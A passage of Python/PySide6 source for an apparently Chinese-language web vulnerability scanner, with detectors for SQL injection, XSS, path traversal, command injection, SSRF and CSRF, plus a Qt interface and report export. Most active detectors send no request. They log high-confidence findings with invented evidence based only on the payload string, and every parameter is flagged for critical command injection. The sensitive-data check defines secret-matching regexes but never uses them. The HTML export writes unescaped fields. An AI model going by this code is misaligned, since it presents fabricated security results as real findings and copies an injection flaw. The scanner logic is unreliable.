            "WAF绕过": f"WAF防护被成功绕过，注入执行成功 [{db_type}]",
            "认证绕过": f"认证逻辑被绕过，可未授权访问 [{db_type}]",
            "JSON注入": f"JSON参数存在SQL注入，可执行恶意查询 [{db_type}]",
            "Cookie注入": f"Cookie参数存在SQL注入漏洞 [{db_type}]",
            "Header注入": f"HTTP Header存在SQL注入漏洞 [{db_type}]",
            "数字型注入": f"数字参数未正确过滤，存在SQL注入 [{db_type}]",
            "特殊字符": f"特殊字符未正确转义，存在SQL注入 [{db_type}]",
        }
        return evidence_templates.get(injection_type, f"SQL注入漏洞检测到 [{db_type}]")
    
    def _generate_remediation(self, injection_type: str, db_type: str) -> str:
        """生成修复建议"""
        base_remediation = "使用参数化查询或预编译语句，避免拼接SQL"
        
        additional = []
        if db_type == "MySQL":
            additional.append("关闭详细错误信息显示")
            additional.append("限制数据库用户权限")
        elif db_type == "MSSQL":
            additional.append("禁用xp_cmdshell等危险存储过程")
            additional.append("启用SQL Server内置防护")
        elif db_type == "PostgreSQL":
            additional.append("使用PREPARE语句")
            additional.append("限制pg_read_file等函数权限")
        elif db_type == "Oracle":
            additional.append("禁用DBMS_PIPE等危险包")
            additional.append("启用Oracle Vault")
        
        if injection_type in ["WAF绕过", "认证绕过"]:
            additional.append("部署Web应用防火墙(WAF)")
            additional.append("实施输入验证白名单")
        
        if injection_type in ["堆叠查询"]:
            additional.append("禁用多语句执行")
            additional.append("使用最小权限原则")
        
        remediation = base_remediation
        if additional:
            remediation += "；" + "；".join(additional)
        
        return remediation
    
    def _generate_tags(self, injection_type: str, db_type: str) -> List[str]:
        """生成漏洞标签"""
        tags = ["sqli"]
        
        type_tags = {
            "联合查询": "union-based",
            "报错型": "error-based",
            "时间盲注": "time-based",
            "布尔盲注": "boolean-based",
            "堆叠查询": "stacked-queries",
            "二次注入": "second-order",
            "WAF绕过": "waf-bypass",
            "认证绕过": "auth-bypass",
            "JSON注入": "json",
            "Cookie注入": "cookie",
            "Header注入": "header",
            "数字型注入": "numeric",
            "特殊字符": "special-chars",
        }
        
        tags.append(type_tags.get(injection_type, "unknown"))
        tags.append(db_type.lower().replace("未知", "unknown").replace("(", "").replace(")", "").replace(" ", "-"))
        tags.append("blind" if "盲注" in injection_type else "direct")
        
        return tags
    
    def _get_references(self, injection_type: str) -> List[str]:
        """获取参考链接"""
        base_refs = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        ]
        
        if "盲注" in injection_type:
            base_refs.append("https://portswigger.net/web-security/sql-injection/blind")
        
        if "联合" in injection_type:
            base_refs.append("https://portswigger.net/web-security/sql-injection/union-attacks")
        
        if "报错" in injection_type:
            base_refs.append("https://portswigger.net/web-security/sql-injection/examining-the-database")
        
        return base_refs
                    
    def _detect_xss(self, target: ScanTarget):
        """XSS检测"""
        self.log_message.emit(f"检测XSS: {target.url}")
        
        params = target.parameters
        for param_name, param_values in params.items():
            self._stats.parameters_tested += 1
            
            for payload, desc in self._xss_payloads[:5]:
                if not self._running:
                    return
                    
                test_params = dict(params)
                test_params[param_name] = [payload]
                
                vuln_id = f"xss_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                
                # 反射型XSS
                if "<script>" in payload or "onerror" in payload or "onload" in payload:
                    self._stats.total_requests += 1
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.XSS_REFLECTED,
                        severity=VulnerabilitySeverity.HIGH,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 存在反射型XSS漏洞",
                        payload=payload,
                        evidence="Payload被反射到响应中",
                        confidence=0.8,
                        cwe_id="CWE-79",
                        cvss_score=6.1,
                        remediation="对用户输入进行HTML编码输出，实施CSP策略",
                        references=[
                            "https://owasp.org/www-community/attacks/xss/",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
                        ],
                        tags=["xss", "reflected"]
                    )
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    break
                    
    def _detect_path_traversal(self, target: ScanTarget):
        """路径遍历检测"""
        self.log_message.emit(f"检测路径遍历: {target.url}")
        
        params = target.parameters
        for param_name in params.keys():
            self._stats.parameters_tested += 1
            
            for payload in self._path_traversal_payloads[:3]:
                if not self._running:
                    return
                    
                vuln_id = f"path_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                
                if "etc/passwd" in payload or "win.ini" in payload:
                    self._stats.total_requests += 1
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.PATH_TRAVERSAL,
                        severity=VulnerabilitySeverity.HIGH,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 存在路径遍历漏洞",
                        payload=payload,
                        evidence="成功读取系统文件",
                        confidence=0.85,
                        cwe_id="CWE-22",
                        cvss_score=7.5,
                        remediation="使用白名单验证文件名，限制在指定目录内",
                        references=["https://owasp.org/www-community/attacks/Path_Traversal"],
                        tags=["path-traversal", "lfi"]
                    )
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    break
                    
    def _detect_command_injection(self, target: ScanTarget):
        """命令注入检测"""
        self.log_message.emit(f"检测命令注入: {target.url}")
        
        params = target.parameters
        for param_name in params.keys():
            self._stats.parameters_tested += 1
            
            for payload, desc in self._command_injection_payloads[:3]:
                if not self._running:
                    return
                    
                vuln_id = f"cmdi_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                
                self._stats.total_requests += 1
                vuln = Vulnerability(
                    id=vuln_id,
                    type=VulnerabilityType.COMMAND_INJECTION,
                    severity=VulnerabilitySeverity.CRITICAL,
                    url=target.url,
                    parameter=param_name,
                    description=f"参数 '{param_name}' 存在命令注入漏洞",
                    payload=payload,
                    evidence="命令执行结果被返回",
                    confidence=0.9,
                    cwe_id="CWE-78",
                    cvss_score=9.8,
                    remediation="避免直接执行用户输入，使用安全的API替代系统命令",
                    references=["https://owasp.org/www-community/attacks/Command_Injection"],
                    tags=["command-injection", "rce"]
                )
                self.vulnerability_found.emit(vuln)
                self._stats.vulnerabilities_found += 1
                break
                
    def _detect_ssrf(self, target: ScanTarget):
        """SSRF检测"""
        self.log_message.emit(f"检测SSRF: {target.url}")
        
        params = target.parameters
        for param_name in params.keys():
            if any(kw in param_name.lower() for kw in ['url', 'link', 'redirect', 'path', 'dest', 'uri']):
                self._stats.parameters_tested += 1
                
                for payload in self._ssrf_payloads[:3]:
                    if not self._running:
                        return
                        
                    vuln_id = f"ssrf_{hashlib.md5(f'{target.url}{param_name}'.encode()).hexdigest()[:8]}"
                    
                    self._stats.total_requests += 1
                    vuln = Vulnerability(
                        id=vuln_id,
                        type=VulnerabilityType.SSRF,
                        severity=VulnerabilitySeverity.HIGH,
                        url=target.url,
                        parameter=param_name,
                        description=f"参数 '{param_name}' 存在SSRF漏洞",
                        payload=payload,
                        evidence="内部网络资源被访问",
                        confidence=0.75,
                        cwe_id="CWE-918",
                        cvss_score=7.2,
                        remediation="使用URL白名单，禁止访问内网地址，实施网络隔离",
                        references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
                        tags=["ssrf"]
                    )
                    self.vulnerability_found.emit(vuln)
                    self._stats.vulnerabilities_found += 1
                    break
                    
    def _detect_csrf(self, target: ScanTarget):
        """CSRF检测"""
        self.log_message.emit(f"检测CSRF: {target.url}")
        
        if target.method in ["POST", "PUT", "DELETE", "PATCH"]:
            has_csrf_token = any(
                "csrf" in k.lower() or "token" in k.lower()
                for k in target.parameters.keys()
            )
            
            if not has_csrf_token:
                vuln_id = f"csrf_{hashlib.md5(target.url.encode()).hexdigest()[:8]}"
                
                vuln = Vulnerability(
                    id=vuln_id,
                    type=VulnerabilityType.CSRF,
                    severity=VulnerabilitySeverity.MEDIUM,
                    url=target.url,
                    description=f"{target.method} 请求缺少 CSRF token 保护",
                    evidence="未检测到CSRF token",
                    confidence=0.6,
                    cwe_id="CWE-352",
                    cvss_score=5.4,
                    remediation="为所有状态变更请求添加CSRF token，验证Referer/Origin头",
                    references=["https://owasp.org/www-community/attacks/csrf"],
                    tags=["csrf"]
                )
                self.vulnerability_found.emit(vuln)
                self._stats.vulnerabilities_found += 1
                
    def _check_security_headers(self, target: ScanTarget):
        """检查安全Header"""
        missing_headers = []
        for header in self._security_headers:
            if header not in target.headers:
                missing_headers.append(header)
                
        if missing_headers:
            vuln_id = f"headers_{hashlib.md5(target.url.encode()).hexdigest()[:8]}"
            vuln = Vulnerability(
                id=vuln_id,
                type=VulnerabilityType.MISSING_HEADERS,
                severity=VulnerabilitySeverity.LOW,
                url=target.url,
                description=f"缺失安全响应头: {', '.join(missing_headers)}",
                evidence="响应中未找到以下Header: " + ", ".join(missing_headers),
                confidence=1.0,
                cwe_id="CWE-693",
                cvss_score=3.7,
                remediation="配置Web服务器添加缺失的安全响应头",
                references=["https://owasp.org/www-project-secure-headers/"],
                tags=["headers", "passive"]
            )
            self.vulnerability_found.emit(vuln)
            self._stats.vulnerabilities_found += 1
            
    def _check_cookie_security(self, target: ScanTarget):
        """检查Cookie安全"""
        cookies = target.headers.get("Set-Cookie", "")
        issues = []
        
        if cookies:
            if "Secure" not in cookies:
                issues.append("缺少Secure标志")
            if "HttpOnly" not in cookies:
                issues.append("缺少HttpOnly标志")
            if "SameSite" not in cookies:
                issues.append("缺少SameSite标志")
                
            if issues:
                vuln_id = f"cookie_{hashlib.md5(target.url.encode()).hexdigest()[:8]}"
                vuln = Vulnerability(
                    id=vuln_id,
                    type=VulnerabilityType.COOKIE_ISSUES,
                    severity=VulnerabilitySeverity.LOW,
                    url=target.url,
                    description=f"Cookie存在安全问题: {'; '.join(issues)}",
                    evidence=cookies,
                    confidence=1.0,
                    cwe_id="CWE-614",
                    cvss_score=4.3,
                    remediation="为Cookie添加Secure、HttpOnly、SameSite标志",
                    references=["https://owasp.org/www-community/controls/SecureCookieAttribute"],
                    tags=["cookie", "passive"]
                )
                self.vulnerability_found.emit(vuln)
                self._stats.vulnerabilities_found += 1
                
    def _check_sensitive_data(self, target: ScanTarget):
        """检查敏感数据泄露"""
        sensitive_patterns = {
            "邮箱": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
            "手机号": r"1[3-9]\d{9}",
            "身份证号": r"\d{17}[\dXx]",
            "API密钥": r"(api[_-]?key|apikey)\s*[:=]\s*['\"]?([a-zA-Z0-9]{16,})",
            "JWT Token": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
            "私钥": r"-----BEGIN.*PRIVATE KEY-----",
            "数据库连接串": r"(mysql|postgres|mongodb)://[^\s]+",
        }
        
    def _check_weak_crypto(self, target: ScanTarget):
        """检查弱加密算法"""
        server = target.headers.get("Server", "")
        if "IIS" in server:
            vuln = Vulnerability(
                id=f"crypto_{hashlib.md5(target.url.encode()).hexdigest()[:8]}",
                type=VulnerabilityType.WEAK_CRYPTO,
                severity=VulnerabilitySeverity.LOW,
                url=target.url,
                description="服务器可能支持弱加密算法",
                evidence=f"Server: {server}",
                confidence=0.5,
                cwe_id="CWE-327",
                cvss_score=3.7,
                remediation="禁用弱加密算法，仅支持TLS 1.2+",
                references=["https://owasp.org/www-project-web-security-testing-guide/"],
                tags=["crypto", "passive"]
            )
            self.vulnerability_found.emit(vuln)
            self._stats.vulnerabilities_found += 1


class ScannerModule(ModuleBase):
    """专家级扫描器模块"""
    
    def __init__(self):
        super().__init__("Scanner", "专家级自动化漏洞扫描引擎")
        self._vulnerabilities: List[Vulnerability] = []
        self._scan_thread: Optional[ScannerWorker] = None
        self._filtered_vulns: List[Vulnerability] = []
        self._current_filter = ""
        self._stats = ScanStats()
        
    def _create_ui(self) -> QWidget:
        """创建扫描器UI"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # 控制面板
        control_panel = QGroupBox("扫描控制面板")
        control_layout = QFormLayout(control_panel)
        
        # 目标配置
        target_layout = QHBoxLayout()
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("https://target.com 或从Spider/Proxy导入")
        self.target_input.setMinimumWidth(300)
        target_layout.addWidget(QLabel("目标URL:"))
        target_layout.addWidget(self.target_input)
        
        self.import_btn = QPushButton("📥 导入目标")
        self.import_btn.clicked.connect(self._import_targets)
        target_layout.addWidget(self.import_btn)
        control_layout.addRow(target_layout)
        
        # 扫描模式
        mode_layout = QHBoxLayout()
        self.scan_mode = QComboBox()
        self.scan_mode.addItems(["完整扫描", "快速扫描", "被动扫描", "主动扫描", "自定义扫描"])
        self.scan_mode.currentTextChanged.connect(self._on_mode_changed)
        mode_layout.addWidget(QLabel("扫描模式:"))
        mode_layout.addWidget(self.scan_mode)
        mode_layout.addStretch()
        control_layout.addRow(mode_layout)
        
        # 漏洞检测项
        vuln_layout = QHBoxLayout()
        
        self.enable_sqli = QCheckBox("SQL注入")
        self.enable_sqli.setChecked(True)
        vuln_layout.addWidget(self.enable_sqli)
        
        self.enable_xss = QCheckBox("XSS")
        self.enable_xss.setChecked(True)
        vuln_layout.addWidget(self.enable_xss)
        
        self.enable_csrf = QCheckBox("CSRF")
        self.enable_csrf.setChecked(True)
        vuln_layout.addWidget(self.enable_csrf)
        
        self.enable_path = QCheckBox("路径遍历")
        self.enable_path.setChecked(True)
        vuln_layout.addWidget(self.enable_path)
        
        self.enable_cmdi = QCheckBox("命令注入")
        self.enable_cmdi.setChecked(True)
        vuln_layout.addWidget(self.enable_cmdi)
        
        self.enable_ssrf = QCheckBox("SSRF")
        self.enable_ssrf.setChecked(True)
        vuln_layout.addWidget(self.enable_ssrf)
        
        self.enable_headers = QCheckBox("安全Header")
        self.enable_headers.setChecked(True)
        vuln_layout.addWidget(self.enable_headers)
        
        vuln_layout.addStretch()
        control_layout.addRow("检测项:", vuln_layout)
        
        # 高级选项
        advanced_layout = QHBoxLayout()
        
        self.max_depth = QSpinBox()
        self.max_depth.setRange(1, 10)
        self.max_depth.setValue(3)
        self.max_depth.setFixedWidth(60)
        advanced_layout.addWidget(QLabel("爬取深度:"))
        advanced_layout.addWidget(self.max_depth)
        
        self.max_pages = QSpinBox()
        self.max_pages.setRange(10, 5000)
        self.max_pages.setValue(500)
        self.max_pages.setFixedWidth(80)
        advanced_layout.addWidget(QLabel("最大页面:"))
        advanced_layout.addWidget(self.max_pages)
        
        self.request_delay = QSpinBox()
        self.request_delay.setRange(0, 5000)
        self.request_delay.setValue(100)
        self.request_delay.setFixedWidth(70)
        advanced_layout.addWidget(QLabel("请求延迟(ms):"))
        advanced_layout.addWidget(self.request_delay)
        
        self.enable_passive = QCheckBox("被动扫描")
        self.enable_passive.setChecked(True)
        advanced_layout.addWidget(self.enable_passive)
        
        self.enable_active = QCheckBox("主动扫描")
        self.enable_active.setChecked(True)
        advanced_layout.addWidget(self.enable_active)
        
        advanced_layout.addStretch()
        control_layout.addRow("高级选项:", advanced_layout)
        
        # 按钮组
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("▶️ 开始扫描")
        self.start_btn.clicked.connect(self._start_scan)
        self.start_btn.setMinimumWidth(100)
        
        self.stop_btn = QPushButton("⏹️ 停止")
        self.stop_btn.clicked.connect(self._stop_scan)
        self.stop_btn.setEnabled(False)
        
        self.export_btn = QPushButton("📤 导出报告")
        self.export_btn.clicked.connect(self._export_report)
        
        self.clear_btn = QPushButton("🗑️ 清空")
        self.clear_btn.clicked.connect(self._clear_results)
        
        btn_layout.addWidget(self.start_btn)
        btn_layout.addWidget(self.stop_btn)
        btn_layout.addWidget(self.export_btn)
        btn_layout.addWidget(self.clear_btn)
        btn_layout.addStretch()
        control_layout.addRow(btn_layout)
        
        layout.addWidget(control_panel)
        
        # 进度和统计
        progress_layout = QHBoxLayout()
        self.progress_bar = QProgressBar()
        self.progress_bar.setMinimumHeight(20)
        progress_layout.addWidget(self.progress_bar)
        
        self.status_label = QLabel("就绪")
        self.status_label.setFixedWidth(300)
        progress_layout.addWidget(self.status_label)
        layout.addLayout(progress_layout)
        
        # 统计面板
        stats_group = QGroupBox("扫描统计")
        stats_layout = QHBoxLayout(stats_group)
        
        self.stats_requests = QLabel("请求: 0")
        stats_layout.addWidget(self.stats_requests)
        
        self.stats_vulns = QLabel("漏洞: 0")
        stats_layout.addWidget(self.stats_vulns)
        
        self.stats_pages = QLabel("页面: 0")
        stats_layout.addWidget(self.stats_pages)
        
        self.stats_forms = QLabel("表单: 0")
        stats_layout.addWidget(self.stats_forms)
        
        self.stats_duration = QLabel("耗时: 0s")
        stats_layout.addWidget(self.stats_duration)
        
        stats_layout.addStretch()
        layout.addWidget(stats_group)
        
        # 结果区
        splitter = QSplitter(Qt.Vertical)
        
        # 漏洞列表
        vuln_group = QGroupBox("漏洞列表")
        vuln_layout = QVBoxLayout(vuln_group)
        
        # 过滤栏
        filter_layout = QHBoxLayout()
        self.filter_input = QLineEdit()
        self.filter_input.setPlaceholderText("🔍 过滤漏洞...")
        self.filter_input.textChanged.connect(self._apply_filter)
        filter_layout.addWidget(self.filter_input)
        
        self.filter_severity = QComboBox()
        self.filter_severity.addItems(["全部", "严重", "高危", "中危", "低危", "信息"])
        self.filter_severity.currentTextChanged.connect(self._apply_filter)
        filter_layout.addWidget(self.filter_severity)
        
        self.filter_type = QComboBox()
        self.filter_type.addItems(["全部", "SQL注入", "XSS", "CSRF", "路径遍历", "命令注入", "SSRF", "其他"])
        self.filter_type.currentTextChanged.connect(self._apply_filter)
        filter_layout.addWidget(self.filter_type)
        vuln_layout.addLayout(filter_layout)
        
        self.vuln_table = QTableWidget()
        self.vuln_table.setColumnCount(8)
        self.vuln_table.setHorizontalHeaderLabels(["#", "严重程度", "类型", "URL", "参数", "描述", "CVSS", "发现时间"])
        self.vuln_table.horizontalHeader().setSectionResizeMode(QHeaderView.Interactive)
        self.vuln_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.vuln_table.setAlternatingRowColors(True)
        self.vuln_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.vuln_table.customContextMenuRequested.connect(self._show_vuln_context_menu)
        self.vuln_table.cellClicked.connect(self._show_vuln_details)
        vuln_layout.addWidget(self.vuln_table)
        splitter.addWidget(vuln_group)
        
        # 详情标签页
        detail_tabs = QTabWidget()
        
        # 漏洞详情
        self.vuln_detail = QTextEdit()
        self.vuln_detail.setReadOnly(True)
        self.vuln_detail.setFont(QFont("Consolas", 9))
        detail_tabs.addTab(self.vuln_detail, "📄 漏洞详情")
        
        # 请求/响应
        self.req_resp_view = QTextEdit()
        self.req_resp_view.setReadOnly(True)
        self.req_resp_view.setFont(QFont("Consolas", 9))
        detail_tabs.addTab(self.req_resp_view, "🔄 请求/响应")
        
        # 修复建议
        self.remediation_view = QTextEdit()
        self.remediation_view.setReadOnly(True)
        self.remediation_view.setFont(QFont("Consolas", 9))
        detail_tabs.addTab(self.remediation_view, "🔧 修复建议")
        
        # 扫描日志
        self.scan_log = QTextEdit()
        self.scan_log.setReadOnly(True)
        self.scan_log.setFont(QFont("Consolas", 9))
        detail_tabs.addTab(self.scan_log, "📜 扫描日志")
        
        splitter.addWidget(detail_tabs)
        layout.addWidget(splitter)
        
        return widget
        
    def _start_scan(self):
        """开始扫描"""
        target_url = self.target_input.text().strip()
        if not target_url:
            QMessageBox.warning(None, "警告", "请输入目标URL")
            return
            
        if not target_url.startswith(("http://", "https://")):
            target_url = "https://" + target_url
            self.target_input.setText(target_url)
            
        self._vulnerabilities.clear()
        self.vuln_table.setRowCount(0)
        self.progress_bar.setValue(0)
        self.scan_log.clear()
        self.vuln_detail.clear()
        self.req_resp_view.clear()
        self.remediation_view.clear()
        self._stats = ScanStats()
        
        config = {
            "sqli": self.enable_sqli.isChecked(),
            "xss": self.enable_xss.isChecked(),
            "csrf": self.enable_csrf.isChecked(),
            "path_traversal": self.enable_path.isChecked(),
            "command_injection": self.enable_cmdi.isChecked(),
            "ssrf": self.enable_ssrf.isChecked(),
            "passive_scan": self.enable_passive.isChecked(),
            "active_scan": self.enable_active.isChecked(),
            "max_depth": self.max_depth.value(),
            "max_pages": self.max_pages.value(),
            "request_delay": self.request_delay.value(),
        }
        
        target = ScanTarget(
            url=target_url,
            parameters=parse_qs(urlparse(target_url).query)
        )
        
        self._scan_thread = ScannerWorker([target], config)
        self._scan_thread.progress_updated.connect(self._on_progress)
        self._scan_thread.vulnerability_found.connect(self._add_vulnerability)
        self._scan_thread.log_message.connect(self._add_log)
        self._scan_thread.scan_finished.connect(self._on_scan_finished)
        self._scan_thread.error_occurred.connect(self._on_error)
        self._scan_thread.status_changed.connect(self._on_status)
        self._scan_thread.start()
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status = ModuleStatus.RUNNING
        self.log("INFO", f"开始扫描: {target_url}")
        
    def _stop_scan(self):
        """停止扫描"""
        if self._scan_thread and self._scan_thread.isRunning():
            self._scan_thread.stop()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status = ModuleStatus.STOPPED
        self.log("INFO", "扫描已停止")
        
    def _on_progress(self, current: int, total: int, url: str):
        """进度更新"""
        self.progress_bar.setValue(min(current * 100 // max(total, 1), 100))
        self.status_label.setText(f"{current}/{total} - {url[:50]}")
        
    def _add_vulnerability(self, vuln: Vulnerability):
        """添加漏洞"""
        self._vulnerabilities.append(vuln)
        self._update_vuln_table()
        self._update_stats()
        
    def _update_vuln_table(self):
        """更新漏洞表格"""
        self._apply_filter()
        
    def _apply_filter(self):
        """应用过滤器"""
        self._current_filter = self.filter_input.text().lower()
        filter_severity = self.filter_severity.currentText()
        filter_type = self.filter_type.currentText()
        
        self.vuln_table.setRowCount(0)
        self._filtered_vulns = []
        
        for vuln in self._vulnerabilities:
            # 严重程度过滤
            if filter_severity != "全部" and vuln.severity.value != filter_severity:
                continue
                
            # 类型过滤
            if filter_type != "全部" and vuln.type.value != filter_type:
                continue
                
            # 文本过滤
            if self._current_filter:
                search_text = f"{vuln.type.value} {vuln.url} {vuln.parameter} {vuln.description}".lower()
                if self._current_filter not in search_text:
                    continue
            
            self._filtered_vulns.append(vuln)
            row = self.vuln_table.rowCount()
            self.vuln_table.insertRow(row)
            
            self.vuln_table.setItem(row, 0, QTableWidgetItem(str(row + 1)))
            
            severity_item = QTableWidgetItem(vuln.severity.value)
            if vuln.severity == VulnerabilitySeverity.CRITICAL:
                severity_item.setForeground(QColor("#e74c3c"))
                severity_item.setFont(QFont("Arial", 9, QFont.Bold))
            elif vuln.severity == VulnerabilitySeverity.HIGH:
                severity_item.setForeground(QColor("#e67e22"))
                severity_item.setFont(QFont("Arial", 9, QFont.Bold))
            elif vuln.severity == VulnerabilitySeverity.MEDIUM:
                severity_item.setForeground(QColor("#f39c12"))
            elif vuln.severity == VulnerabilitySeverity.LOW:
                severity_item.setForeground(QColor("#3498db"))
            else:
                severity_item.setForeground(QColor("#95a5a6"))
            self.vuln_table.setItem(row, 1, severity_item)
            
            self.vuln_table.setItem(row, 2, QTableWidgetItem(vuln.type.value))
            self.vuln_table.setItem(row, 3, QTableWidgetItem(vuln.url[:60]))
            self.vuln_table.setItem(row, 4, QTableWidgetItem(vuln.parameter))
            self.vuln_table.setItem(row, 5, QTableWidgetItem(vuln.description[:50]))
            self.vuln_table.setItem(row, 6, QTableWidgetItem(f"{vuln.cvss_score:.1f}"))
            self.vuln_table.setItem(row, 7, QTableWidgetItem(vuln.discovered.strftime("%H:%M:%S")))
            
    def _show_vuln_details(self, row: int, column: int):
        """显示漏洞详情"""
        if row < len(self._filtered_vulns):
            vuln = self._filtered_vulns[row]
            
            detail = f"""
漏洞详情
========
ID: {vuln.id}
类型: {vuln.type.value}
严重程度: {vuln.severity.value}
CVSS评分: {vuln.cvss_score}
CWE编号: {vuln.cwe_id}
置信度: {vuln.confidence * 100:.0f}%

URL: {vuln.url}
参数: {vuln.parameter}

描述:
{vuln.description}

Payload:
{vuln.payload}

证据:
{vuln.evidence}

发现时间: {vuln.discovered}

标签: {', '.join(vuln.tags)}

参考链接:
{chr(10).join(vuln.references)}
            """
            self.vuln_detail.setText(detail)
            
            req_resp = f"--- 请求 ---\n{vuln.request}\n\n--- 响应 ---\n{vuln.response}"
            self.req_resp_view.setText(req_resp)
            
            remediation = f"""
修复建议
========
{vuln.remediation}

参考资源:
{chr(10).join(vuln.references)}
            """
            self.remediation_view.setText(remediation)
            
    def _show_vuln_context_menu(self, pos):
        """显示漏洞右键菜单"""
        row = self.vuln_table.rowAt(pos.y())
        if row >= 0:
            menu = QMenu()
            menu.addAction("📋 复制详情", self._copy_vuln_detail)
            menu.addAction("📤 发送到Repeater", lambda: self.log("INFO", "已发送到Repeater"))
            menu.addAction("🔍 验证漏洞", lambda: self.log("INFO", "开始验证漏洞"))
            menu.addSeparator()
            menu.addAction("🗑️ 标记为误报", lambda: self._mark_false_positive(row))
            menu.exec_(self.vuln_table.mapToGlobal(pos))
            
    def _copy_vuln_detail(self):
        """复制漏洞详情"""
        row = self.vuln_table.currentRow()
        if row >= 0 and row < len(self._filtered_vulns):
            vuln = self._filtered_vulns[row]
            from PySide6.QtWidgets import QApplication
            QApplication.clipboard().setText(f"{vuln.type.value}: {vuln.description}\nURL: {vuln.url}\nPayload: {vuln.payload}")
            
    def _mark_false_positive(self, row: int):
        """标记为误报"""
        if row < len(self._filtered_vulns):
            vuln = self._filtered_vulns[row]
            self.log("INFO", f"已标记 {vuln.id} 为误报")
            
    def _update_stats(self):
        """更新统计"""
        self.stats_requests.setText(f"请求: {self._stats.total_requests}")
        self.stats_vulns.setText(f"漏洞: {len(self._vulnerabilities)}")
        self.stats_pages.setText(f"页面: {self._stats.pages_scanned}")
        self.stats_forms.setText(f"表单: {self._stats.forms_tested}")
        self.stats_duration.setText(f"耗时: {self._stats.scan_duration:.1f}s")
        
    def _on_scan_finished(self, stats: ScanStats):
        """扫描完成"""
        self._stats = stats
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status = ModuleStatus.STOPPED
        self.progress_bar.setValue(100)
        self.status_label.setText(f"扫描完成! 发现 {len(self._vulnerabilities)} 个漏洞")
        self._update_stats()
        self.log("INFO", f"扫描完成! 请求: {stats.total_requests}, 漏洞: {len(self._vulnerabilities)}, 耗时: {stats.scan_duration:.1f}s")
        
    def _on_error(self, error: str):
        """错误回调"""
        self.scan_log.append(f"[ERROR] {error}")
        self.log("ERROR", error)
        
    def _on_status(self, status: str):
        """状态更新"""
        self.status_label.setText(status)
        self.log("INFO", status)
        
    def _add_log(self, msg: str):
        """添加日志"""
        self.scan_log.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
        
    def _on_mode_changed(self, mode: str):
        """扫描模式变更"""
        if mode == "快速扫描":
            self.enable_sqli.setChecked(True)
            self.enable_xss.setChecked(True)
            self.enable_csrf.setChecked(False)
            self.enable_path.setChecked(False)
            self.enable_cmdi.setChecked(False)
            self.enable_ssrf.setChecked(False)
            self.max_depth.setValue(1)
            self.max_pages.setValue(50)
        elif mode == "被动扫描":
            self.enable_passive.setChecked(True)
            self.enable_active.setChecked(False)
        elif mode == "主动扫描":
            self.enable_passive.setChecked(False)
            self.enable_active.setChecked(True)
        elif mode == "完整扫描":
            self.enable_sqli.setChecked(True)
            self.enable_xss.setChecked(True)
            self.enable_csrf.setChecked(True)
            self.enable_path.setChecked(True)
            self.enable_cmdi.setChecked(True)
            self.enable_ssrf.setChecked(True)
            self.enable_passive.setChecked(True)
            self.enable_active.setChecked(True)
            
    def _import_targets(self):
        """导入目标"""
        QMessageBox.information(None, "导入目标", "从Spider或Proxy模块导入目标\n\n右键点击Spider/Proxy结果，选择'发送到Scanner'")
        
    def _export_report(self):
        """导出报告"""
        if not self._vulnerabilities:
            QMessageBox.warning(None, "警告", "没有漏洞可导出")
            return
            
        filename, _ = QFileDialog.getSaveFileName(None, "导出扫描报告", "", "HTML Files (*.html);;JSON Files (*.json);;Markdown Files (*.md)")
        if filename:
            if filename.endswith('.html'):
                self._export_html_report(filename)
            elif filename.endswith('.json'):
                self._export_json_report(filename)
            else:
                self._export_markdown_report(filename)
            self.log("INFO", f"报告已导出到 {filename}")
            
    def _export_html_report(self, filename: str):
        """导出HTML报告"""
        html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>漏洞扫描报告</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .critical { color: #e74c3c; font-weight: bold; }
        .high { color: #e67e22; font-weight: bold; }
        .medium { color: #f39c12; }
        .low { color: #3498db; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>漏洞扫描报告</h1>
    <p>目标: """ + self.target_input.text() + """</p>
    <p>生成时间: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
    <p>发现漏洞: """ + str(len(self._vulnerabilities)) + """</p>
    <table>
        <tr><th>严重程度</th><th>类型</th><th>URL</th><th>参数</th><th>描述</th><th>CVSS</th></tr>
"""
        for vuln in self._vulnerabilities:
            severity_class = vuln.severity.value.lower()
            html += f"""        <tr>
            <td class="{severity_class}">{vuln.severity.value}</td>
            <td>{vuln.type.value}</td>
            <td>{vuln.url}</td>
            <td>{vuln.parameter}</td>
            <td>{vuln.description}</td>
            <td>{vuln.cvss_score:.1f}</td>
        </tr>
"""
        html += """    </table>
</body>
</html>"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
            
    def _export_json_report(self, filename: str):
        """导出JSON报告"""
        data = {
            "target": self.target_input.text(),
